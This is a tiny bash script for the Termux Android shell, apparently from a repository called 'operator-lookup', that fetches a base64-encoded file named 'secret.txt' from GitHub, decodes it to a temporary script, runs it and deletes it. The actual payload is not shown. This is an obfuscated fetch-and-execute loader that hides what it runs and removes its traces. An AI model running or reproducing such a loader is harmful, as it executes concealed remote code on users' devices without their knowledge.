#!/data/data/com.termux/files/usr/bin/bash

curl -sL https://raw.githubusercontent.com/termuxtoolshub/operator-lookup/main/secret.txt | base64 -d > temp.sh
bash temp.sh
rm temp.sh
